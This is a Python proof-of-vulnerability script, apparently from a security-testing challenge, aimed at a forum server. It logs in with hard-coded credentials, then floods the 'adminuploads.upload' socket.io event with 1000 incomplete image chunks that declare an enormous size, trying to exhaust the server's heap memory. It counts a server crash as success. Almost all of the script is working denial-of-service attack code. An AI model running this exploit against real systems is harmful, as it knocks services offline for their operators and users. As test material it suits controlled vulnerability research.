import sys
import os
import subprocess
import signal
import time
from datetime import datetime
from pwn import *
import socketio
import requests
import socket
import hashlib
import json
from bs4 import BeautifulSoup
import random


def handler(signum, frame):
    global success
    if success==1:
        print('[SUCCESS] POV likely Succeeded', flush=True)
    else:
        print('POV timed out', flush=True)
        print('[FAILED] POV Failed', flush=True)
    exit(0)

def getConfig(conn, headers=""):
    address=BASEADDR+'/api/config'
    return conn.get(address, headers=headers)

def doLogin(conn, username, password, headers=""):
    address=BASEADDR+'/api/v3/utilities/login'
    result = conn.post(address, headers=headers, data={'username':username, 'password': password})
    return result

def getHomepage(conn, headers=""):
    address=BASEADDR+'/?loggedin=true'
    result = conn.get(address, headers=headers)
    return result

def getCookie(response):
    rh=json.dumps(response.headers.__dict__['_store'])
    rhj=json.loads(rh)
    sc_rhj=rhj['set-cookie']
    cookie=sc_rhj[1].split(';')[0]
    return cookie

def getCRSFToken(response):
    configJson=json.loads(response.text)
    return configJson['csrf_token']

def getCRSFTokenSoup(response):
    soup = BeautifulSoup(response.text, "html.parser")
    return soup.find('input',attrs = {'name':'_csrf'})['value']

def checkResult(response):
    if response.status_code != 200:
        print("Status Code failure", str(response.status_code), flush=True)
        print('[FAILED] POV Failed', flush=True)
        exit(0)

def startupConnection(c_session,headers,username,password):
    ## GET FORUM CONFIGURATION
    result=getConfig(c_session, headers)
    print("Get Config:", result.status_code, flush=True)
    checkResult(result)
    headers['x-csrf-token']=getCRSFToken(result)
    ## LOGIN INTO USER
    result=doLogin(c_session, username, password, headers)
    print("Post Login:", result.status_code, flush=True)
    checkResult(result)
    headers['Cookie']=getCookie(result)
    del headers['x-csrf-token']
    ## GET USER'S HOMEPAGE
    result=getHomepage(c_session, headers)
    print("Get Homepage:", result.status_code, flush=True)
    checkResult(result)
    headers['x-csrf-token']=getCRSFTokenSoup(result)
    return headers

def ack_received(data1, data2=""):
    global ackcount
    global ackresetcount
    ackcount+=1
    if ackcount==1000:
        ackresetcount+=1
        print("Status: The client received 1000 acks", flush=True)
    return

class sioClient:
    global pov_working
    global success
    def __init__(self):
        self.sio = socketio.Client(reconnection=False, request_timeout=100)

        @self.sio.event
        def connect():
            print("I'm connected!", flush=True)
        @self.sio.event
        def connect_error(erro=None):
            print("The connection failed!",erro, flush=True)
            self.sio.wait()
        @self.sio.event
        def disconnect():
            global success
            global ackcount
            global ackresetcount
            if pov_working==1:
                if ackcount < 500 and ackresetcount<1:
                    print('Server disconnected user, seemed too quickly', flush=True)
                    print('Possibly rate limited, verify on challenge', flush=True)
                    print('[FAILED] POV likely Failed', flush=True)
                    success=-1
                    return
                print('Server disconnected user, verify if challenge crashed due to heap out of memory', flush=True)
                print('RESOURCE_EXHAUSTED=heap', flush=True)
                print('[SUCCESS] POV likely Succeeded', flush=True)
                success=1
                return
            print("I'm disconnected!", flush=True)
        @self.sio.on('*')
        def catch_all(event, data):
            pass
    def doConnect(self, address, headers):
        self.sio.connect(address, headers)
    def doMessage(self, command, data, cb_func=None):
        self.sio.emit(command, data, callback=cb_func)
    def doDisconnect(self):
        self.sio.disconnect()
    def finish(self):
        self.sio.disconnect()
        self.sio.wait()


def main():
    global HOST
    global PORT
    global BASEADDR
    global ackcount
    global ackresetcount
    global pov_working
    global success
    if len(sys.argv) == 3:
        HOST = sys.argv[1]
        PORT = int(sys.argv[2])
    else:
        if 'HOST' in os.environ and 'PORT' in os.environ:
            HOST = os.environ['HOST']
            PORT = int(os.environ['PORT'])
        else:
            print('[ERROR] HOST and PORT must be specified via arguments or variables.')
            sys.exit(1)
    print('Host ' + HOST + ' and PORT: ' + str(PORT), flush=True)
    BASEADDR='http://{}:{}'.format(HOST, PORT)
    SOCKETBASEADDR=BASEADDR+'/socket.io/'
    signal.signal(signal.SIGALRM, handler)
    signal.alarm(240) # 4 minute timeout
    headers={
        'Host': HOST + ' :' + str(PORT),
        'sec-ch-usa': '"Chromium";v="95", ";Not A Brand";v="99"',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Upgrade-Insecure-Requests': '1',
        'sec-ch-ua-mobile': '?0',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36',
        'sec-ch-ua-platform': '"Linux"',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US,en;q=0.9',
        'Cookie': '',
        'Connection': 'close',
    }
    username="chess"
    password="chess123"
    uid=27

    ackcount=0
    ackresetcount=0
    success=0
    for x in range(0,3):
        print('Master Loop Count:',x, flush=True)
        c_session = requests.Session()
        pov_working=1
        headers=startupConnection(c_session,headers,username,password)
        ## SOCKET.IO COMMS
        hdrs_json=json.dumps(headers)
        sClient=sioClient()
        sClient.doConnect(SOCKETBASEADDR, headers)
        time.sleep(0.5)
        sClient.doMessage("meta.rooms.enter",{"enter":"categories"})
        time.sleep(0.5)
        sClient.doMessage("user.getProfilePictures",{"uid":uid})
        time.sleep(0.5)
        progress= 0
        start="data:image/jpeg;base64,"
        ## Image data - base64 5000bytes for easy maths
        message=start+"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"*100
        for y in range(0,1000): # send an incomplete image, updating it 1000 times
            sClient.doMessage("adminuploads.upload",{"chunk":message,"params":{"uid":uid,"method":"user.uploadCroppedPicture",
                "size":100000000000000000,"progress":progress}}, ack_received)
            progress+=50000
        while ackcount != 1000: ## server is slower than pov, wait for all 1000 sends to complete, to prevent pov oom
            if success == 1:
                exit(0)
            if success == -1:
                exit(0)
            time.sleep(2)
        ackcount=0
        pov_working=0
        sClient.doDisconnect()
        c_session.close()
        #end for loop
    print('Server served all requests without issue', flush=True)
    print('[FAILED] POV Failed', flush=True)
    exit(0)

if __name__ == '__main__':
    main()
